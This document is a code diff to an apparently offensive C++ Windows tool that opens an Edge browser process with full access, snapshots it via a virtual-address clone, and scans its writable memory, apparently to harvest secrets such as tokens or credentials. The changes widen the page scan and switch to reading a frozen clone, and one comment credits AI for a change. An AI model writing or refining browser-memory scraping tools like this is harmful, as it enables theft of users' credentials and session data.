@@ -59,7 +59,11 @@ void ScanMemoryRegions(HANDLE hProcess, HPSS hSnapshot) {
     std::set<std::string> seen;
 
     while (PssWalkSnapshot(hSnapshot, PSS_WALK_VA_SPACE, hWalker, &vaEntry, sizeof(vaEntry)) == ERROR_SUCCESS) {
-        if (vaEntry.State == MEM_COMMIT && (vaEntry.Protect == PAGE_READWRITE)) {
+        // Bitmask check to catch all writable/executable pages while skipping guards
+        bool isWritable = (vaEntry.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE_WRITECOPY));
+        bool isGuarded = (vaEntry.Protect & (PAGE_GUARD | PAGE_NOACCESS));
+
+        if (vaEntry.State == MEM_COMMIT && isWritable && !isGuarded) {
             std::vector<char> buffer(vaEntry.RegionSize);
             SIZE_T bytesRead;
 
@@ -150,7 +154,10 @@ int main() {
     // Handle to Edge process with limited perms: PROCESS_QUERY_INFORMATION & PROCESS_VM_READ
     SetColor(14); std::wcout << L"[*] "; SetColor(7);
     std::wcout << L"Creating handle to process " << targetPid << std::endl;
-    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE, FALSE, targetPid);
+    
+    
+    // Note: VA Cloning requires PROCESS_ALL_ACCESS or PROCESS_CREATE_PROCESS to succeed on modern Windows
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
     if (!hProcess) {
         SetColor(12); std::cerr << "[-] "; SetColor(7);
         std::cerr << "OpenProcess failed. Error: " << GetLastError() << std::endl;
@@ -165,7 +172,10 @@ int main() {
     SetColor(14); std::wcout << L"[*] "; SetColor(7);
     std::wcout << L"Attempting Process Snapshot... " << std::endl;
     HPSS hSnapshot = NULL;
-    DWORD flags = PSS_CAPTURE_VA_SPACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_HANDLES;
+    
+    
+    // Added PSS_CAPTURE_VA_CLONE to ensure we are reading from a point-in-time kernel clone (Thanks to AI for this one)
+    DWORD flags = PSS_CAPTURE_VA_SPACE | PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_THREADS | PSS_CAPTURE_HANDLES;
     DWORD result = PssCaptureSnapshot(hProcess, (PSS_CAPTURE_FLAGS)flags, 0, &hSnapshot);
     if (result != ERROR_SUCCESS) {
         SetColor(12); std::cerr << "[-] "; SetColor(7);
@@ -178,15 +188,17 @@ int main() {
 
 
 
-    // Run the memory scan logic directly on the process (frozen by snapshot context)
-    ScanMemoryRegions(hProcess, hSnapshot);
-
+    // Extract the handle to the frozen VA Clone from the snapshot
+    HANDLE hFrozenClone = NULL;
+    if (PssQuerySnapshot(hSnapshot, PSS_QUERY_VA_CLONE_INFORMATION, &hFrozenClone, sizeof(hFrozenClone)) == ERROR_SUCCESS && hFrozenClone) {
+        ScanMemoryRegions(hFrozenClone, hSnapshot);
+        CloseHandle(hFrozenClone);
+    }
 
 
     // Cleanup
     PssFreeSnapshot(GetCurrentProcess(), hSnapshot);
     CloseHandle(hProcess);
-    
     SetColor(14); std::cout << "\n[*] "; SetColor(7);
     std::cout << "Task complete." << std::endl;
     return 0;
